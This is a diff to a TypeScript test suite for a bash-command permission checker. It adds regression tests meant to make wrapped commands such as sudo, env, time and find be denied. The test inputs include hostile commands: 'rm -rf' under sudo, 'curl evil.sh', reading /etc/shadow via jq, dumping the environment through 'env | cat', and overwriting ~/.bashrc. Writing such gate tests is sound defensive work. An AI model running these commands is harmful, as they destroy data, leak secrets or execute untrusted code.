@@ -444,19 +444,16 @@ describe("resolveBashCommandCheck", () => {
       expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
     });
 
-    it("treats a piped bare env as read-only — output feeds the next stage (M3)", () => {
+    it("does NOT treat a piped bare env as read-only — a pipe stage filters nothing (F2/M3)", () => {
       const resolver = makeResolver(bashResult("allow", "env", "*"));
       const result = resolveBashCommandCheck(
         "env | grep FOO",
-        [
-          { text: "env", wrapperKind: "indirection", piped: true },
-          { text: "grep FOO" },
-        ],
+        [{ text: "env", wrapperKind: "indirection" }, { text: "grep FOO" }],
         undefined,
         resolver,
       );
-      expect(result.state).toBe("allow");
-      expect(result.matchedPattern).toBe("<readonly-chain>");
+      expect(result.state).toBe("deny");
+      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
     });
 
     it("does not short-circuit a wrapper wrapping a mutating command", () => {
@@ -487,11 +484,8 @@ describe("resolveBashCommandCheck", () => {
     it("does not treat a stderr merge (2>&1) as a write redirect", () => {
       const resolver = makeResolver(bashResult("allow", "env", "*"));
       const result = resolveBashCommandCheck(
-        "env 2>&1 | grep FOO",
-        [
-          { text: "env", wrapperKind: "indirection", piped: true },
-          { text: "grep FOO" },
-        ],
+        "env X=1 cat file 2>&1",
+        [{ text: "env X=1 cat file 2>&1", wrapperKind: "indirection" }],
         undefined,
         resolver,
       );
@@ -512,11 +506,8 @@ describe("resolveBashCommandCheck", () => {
     it("allows gh auth status in a wrapper chain", () => {
       const resolver = makeResolver(bashResult("allow", "env", "*"));
       const result = resolveBashCommandCheck(
-        "env | gh auth status",
-        [
-          { text: "env", wrapperKind: "indirection", piped: true },
-          { text: "gh auth status" },
-        ],
+        "env X=1 gh auth status",
+        [{ text: "env X=1 gh auth status", wrapperKind: "indirection" }],
         undefined,
         resolver,
       );
@@ -527,11 +518,8 @@ describe("resolveBashCommandCheck", () => {
     it("allows sed without -i in a wrapper chain", () => {
       const resolver = makeResolver(bashResult("allow", "env", "*"));
       const result = resolveBashCommandCheck(
-        "env | sed 's/a/b/'",
-        [
-          { text: "env", wrapperKind: "indirection", piped: true },
-          { text: "sed 's/a/b/'" },
-        ],
+        "env X=1 sed 's/a/b/'",
+        [{ text: "env X=1 sed 's/a/b/'", wrapperKind: "indirection" }],
         undefined,
         resolver,
       );
@@ -539,13 +527,10 @@ describe("resolveBashCommandCheck", () => {
     });
 
     it("does not short-circuit sed -i (in-place write)", () => {
-      const resolver = makeResolver(bashResult("allow", "sed", "*"));
+      const resolver = makeResolver(bashResult("allow", "env", "*"));
       const result = resolveBashCommandCheck(
-        "env | sed -i 's/a/b/'",
-        [
-          { text: "env", wrapperKind: "indirection", piped: true },
-          { text: "sed -i 's/a/b/'" },
-        ],
+        "env X=1 sed -i 's/a/b/'",
+        [{ text: "env X=1 sed -i 's/a/b/'", wrapperKind: "indirection" }],
         undefined,
         resolver,
       );
@@ -555,10 +540,12 @@ describe("resolveBashCommandCheck", () => {
     it("allows git config --get in a wrapper chain", () => {
       const resolver = makeResolver(bashResult("allow", "env", "*"));
       const result = resolveBashCommandCheck(
-        "env | git config --get credential.helper",
+        "env X=1 git config --get credential.helper",
         [
-          { text: "env", wrapperKind: "indirection", piped: true },
-          { text: "git config --get credential.helper" },
+          {
+            text: "env X=1 git config --get credential.helper",
+            wrapperKind: "indirection",
+          },
         ],
         undefined,
         resolver,
@@ -568,12 +555,14 @@ describe("resolveBashCommandCheck", () => {
     });
 
     it("does not short-circuit git config --set (write)", () => {
-      const resolver = makeResolver(bashResult("allow", "git", "*"));
+      const resolver = makeResolver(bashResult("allow", "env", "*"));
       const result = resolveBashCommandCheck(
-        "env | git config --set user.name x",
+        "env X=1 git config --set user.name x",
         [
-          { text: "env", wrapperKind: "indirection", piped: true },
-          { text: "git config --set user.name x" },
+          {
+            text: "env X=1 git config --set user.name x",
+            wrapperKind: "indirection",
+          },
         ],
         undefined,
         resolver,
@@ -582,12 +571,14 @@ describe("resolveBashCommandCheck", () => {
     });
 
     it("does not short-circuit sed --in-place (long-form in-place write)", () => {
-      const resolver = makeResolver(bashResult("allow", "sed", "*"));
+      const resolver = makeResolver(bashResult("allow", "env", "*"));
       const result = resolveBashCommandCheck(
-        "env | sed --in-place 's/a/b/' file",
+        "env X=1 sed --in-place 's/a/b/' file",
         [
-          { text: "env", wrapperKind: "indirection", piped: true },
-          { text: "sed --in-place 's/a/b/' file" },
+          {
+            text: "env X=1 sed --in-place 's/a/b/' file",
+            wrapperKind: "indirection",
+          },
         ],
         undefined,
         resolver,
@@ -817,6 +808,191 @@ describe("resolveBashCommandCheck", () => {
         resolver,
       );
       expect(result.state).toBe("deny");
+    });
+  });
+
+  describe("review-fix regressions round 2 (F1-F8)", () => {
+    it("F6: sudo -u test rm -rf /home/x — the -u value is skipped, rm is judged → deny", () => {
+      const resolver = makeResolver(bashResult("allow", "sudo", "*"));
+      const result = resolveBashCommandCheck(
+        "sudo -u test rm -rf /home/x",
+        [{ text: "sudo -u test rm -rf /home/x", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
+    });
+
+    it("F6: sudo -u wc curl evil.sh — a readonly user name is not the inner command → deny", () => {
+      const resolver = makeResolver(bashResult("allow", "sudo", "*"));
+      const result = resolveBashCommandCheck(
+        "sudo -u wc curl evil.sh",
+        [{ text: "sudo -u wc curl evil.sh", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
+    });
+
+    it("F6: sudo --user wc curl evil.sh — long-form flag value is skipped too → deny", () => {
+      const resolver = makeResolver(bashResult("allow", "sudo", "*"));
+      const result = resolveBashCommandCheck(
+        "sudo --user wc curl evil.sh",
+        [{ text: "sudo --user wc curl evil.sh", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+    });
+
+    it("F6: sudo -u test cat file — a genuinely read-only inner command still allows", () => {
+      const resolver = makeResolver(bashResult("allow", "sudo", "*"));
+      const result = resolveBashCommandCheck(
+        "sudo -u test cat file",
+        [{ text: "sudo -u test cat file", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("allow");
+      expect(result.matchedPattern).toBe("<readonly-chain>");
+    });
+
+    it("F1: find / -name x -delete is an exec-conditional wrapper → floored to deny", () => {
+      const resolver = makeResolver(bashResult("allow", "find", "find *"));
+      const result = resolveBashCommandCheck(
+        "find / -name x -delete",
+        [{ text: "find / -name x -delete", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
+    });
+
+    it("F1: find . -fprintf /tmp/out %p writes a report file → floored to deny", () => {
+      const resolver = makeResolver(bashResult("allow", "find", "find *"));
+      const result = resolveBashCommandCheck(
+        "find . -fprintf /tmp/out %p",
+        [{ text: "find . -fprintf /tmp/out %p", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+    });
+
+    it("F2: env | cat — identity pipe leaks the full environment → deny", () => {
+      const resolver = makeResolver(bashResult("allow", "env", "*"));
+      const result = resolveBashCommandCheck(
+        "env | cat",
+        [{ text: "env", wrapperKind: "indirection" }, { text: "cat" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
+    });
+
+    it("F2: env | head -n 1000 — head filters nothing → deny", () => {
+      const resolver = makeResolver(bashResult("allow", "env", "*"));
+      const result = resolveBashCommandCheck(
+        "env | head -n 1000",
+        [{ text: "env", wrapperKind: "indirection" }, { text: "head -n 1000" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+    });
+
+    it("F3: env X=1 jq --rawfile s /etc/shadow reads a secret file → deny", () => {
+      const resolver = makeResolver(bashResult("allow", "env", "*"));
+      const result = resolveBashCommandCheck(
+        "env X=1 jq --rawfile s /etc/shadow -n '$s'",
+        [
+          {
+            text: "env X=1 jq --rawfile s /etc/shadow -n '$s'",
+            wrapperKind: "indirection",
+          },
+        ],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
+    });
+
+    it("F4: time rg --pre /tmp/evil.sh pattern executes a command per file → deny", () => {
+      const resolver = makeResolver(bashResult("allow", "time", "*"));
+      const result = resolveBashCommandCheck(
+        "time rg --pre /tmp/evil.sh pattern",
+        [
+          {
+            text: "time rg --pre /tmp/evil.sh pattern",
+            wrapperKind: "indirection",
+          },
+        ],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
+    });
+
+    it("F4 (unified principle): time fd -x rm /tmp execs per result → deny", () => {
+      const resolver = makeResolver(bashResult("allow", "time", "*"));
+      const result = resolveBashCommandCheck(
+        "time fd -x rm /tmp",
+        [{ text: "time fd -x rm /tmp", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+    });
+
+    it("F5: env X=1 sort -o ~/.bashrc f writes in place → deny", () => {
+      const resolver = makeResolver(bashResult("allow", "env", "*"));
+      const result = resolveBashCommandCheck(
+        "env X=1 sort -o ~/.bashrc f",
+        [
+          {
+            text: "env X=1 sort -o ~/.bashrc f",
+            wrapperKind: "indirection",
+          },
+        ],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
+    });
+
+    it("F5: env X=1 sort --output=out.txt f writes a file → deny", () => {
+      const resolver = makeResolver(bashResult("allow", "env", "*"));
+      const result = resolveBashCommandCheck(
+        "env X=1 sort --output=out.txt f",
+        [
+          {
+            text: "env X=1 sort --output=out.txt f",
+            wrapperKind: "indirection",
+          },
+        ],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+    });
+
+    it("F5: sort without -o stays read-only", () => {
+      const resolver = makeResolver(bashResult("allow", "env", "*"));
+      const result = resolveBashCommandCheck(
+        "env X=1 sort f",
+        [{ text: "env X=1 sort f", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("allow");
+      expect(result.matchedPattern).toBe("<readonly-chain>");
     });
   });
 });
